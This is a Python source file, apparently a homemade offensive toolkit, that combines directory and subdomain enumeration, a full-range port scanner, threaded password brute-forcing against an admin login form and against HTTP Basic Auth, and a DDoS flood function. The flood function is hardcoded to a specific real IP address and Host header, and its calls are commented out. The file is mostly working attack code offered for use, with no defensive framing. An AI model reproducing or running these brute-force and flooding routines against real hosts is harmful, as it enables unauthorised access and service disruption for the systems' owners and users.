import requests
import sys
import threading
import time
import argparse
import socket
import base64
from requests_toolbelt.utils import dump
from requests.auth import HTTPBasicAuth

def run(i):

		url= "https://thinc.local:8000/admin"

		data={
		'password':i,
		'send':'/admin/site',
		'login':''

		}

		req = requests.post(url, data=data ,verify=False)

		if "invalid password" not in req.text:
			
			print(req.text)
		else:
			print(i)



def dir(Url,i):

		url = str(Url)+str(i)


		r = requests.post(url,verify=False)

		if r.status_code == 404 :
			"""sds"""
		# elif r.status_code == 200 :
		else:
			print(f'[ {r.status_code} ] Found /{i}')

		# elif r.status_code == 300 or r.status_code > 300 and r.status_code < 400:
		# 	print(f'[ {r.status_code} ] Found /{i}')


def subdomian(Url,i):

	url = 'https://'+str(i)+'.'+str(Url)+'/'

	r = requests.get(url,verify=False)

	# if r.status_code == 404 :
	# 	"""sds"""
	# else:
	print(f'[ {r.status_code} ] Found {i}.{Url}')

def ddos(url):
	while True:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('185.27.134.229',80))
		s.sendto(("GET / HTTP/1.1\nHost: at9w.eb2a.com\r\n\r\n").encode('ascii'),('185.27.134.229',80))
		# print(n)

def portscanner(Ip,Port):

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	socket.setdefaulttimeout(50)
	result = s.connect_ex((Ip,int(Port))) 

	if result == 0:
		print('[OPEN] Port open :',Port)
	s.close()

def auth(user,Pass,url):

	Cred1= str(user)+':'+str(Pass)
	Cred = base64.b64encode(Cred1.encode("utf-8"))
	# headers={

	# 'Authorization': 'base64 '+str(Cred)

	# }
	
	# r = requests.get(url,headers=headers)
	r = requests.get(url,auth=HTTPBasicAuth(user,Pass))
	# if r.status_code != 401:
	# data = dump.dump_all(r)
	# print(data.decode('utf-8'))
	if "Unauthorized" not in r.text :
		print(f'[ {r.status_code} ]',str(user)+':'+str(Pass))


def run_dir(File,url):
	ffile = open(File,'r')
	file=ffile.readlines()
	url = url
	start = time.time()
	for i in file:
		thread = threading.Thread(target=dir,args=(str(url),str(i.strip()),))
		thread.start()
	final = time.time()
	print(f'Time: {final-start}')


parser = argparse.ArgumentParser(description='Directory Checker  Created By ROOM<N\nFaster than yiuuuuuuuuuuuui THHHHHHHIIINK')
parser.add_argument('--wordlist','-w', help="Wordlist File")
parser.add_argument('--url','-u', help="Target Url ")
parser.add_argument('--ddos','-dd', help="DDOS Attack",action="store_true")
parser.add_argument('--portscanner', help = "Scanning Ports")
parser.add_argument('--auth','-A', help = "HTTP Basic Authntication",action="store_true")
parser.add_argument('--userlist', help = "User list")
parser.add_argument('-U', help = "Single user")
parser.add_argument('--dir',help="For Directory Searching",action="store_true")
args = parser.parse_args()

if len(sys.argv) >1 :
	"""ddd"""
	# if args.ddos:
	# 	for i in range(1000):
	# 		thread = threading.Thread(target=ddos,args=(str(args.url),))
	# 		thread.start()
	if args.dir:

		run_dir(args.wordlist,args.url)

	if args.portscanner != None:
		for i in range(1,65535):

			thread = threading.Thread(target=portscanner,args=(str(args.portscanner),int(i),))
			thread.start()


	if args.auth:

		print("Attack on HTTP Basic Authntication")
		print(args.U)
		password = open(args.wordlist,'r').readlines()
		if args.U != None:
			user = args.U
			for Pass in password:
				# auth(str(user),str(Pass),str(args.url))
				try:
					thread = threading.Thread(target=auth,args=(str(user).strip(),str(Pass),str(args.url),))
					thread.start()
				except:
					pass
		else:
			user = open(args.userlist,'r').readlines()

			for user in user:
				for Pass in password:
					# auth(str(user),str(Pass),str(args.url))
					try:
						thread = threading.Thread(target=auth,args=(str(user).strip(),str(Pass).strip(),str(args.url),))
						thread.start()
					except:
						pass
	# main(args.wordlist,args.url)

else:
	print('usage: Rooman.py [-h] [--wordlist WORDLIST] [--url URL]')

# if args.ddos:
# 	for i in range(1000):
# 		thread = threading.Thread(target=ddos,args=(str(args.url),))
# 		thread.start()

 


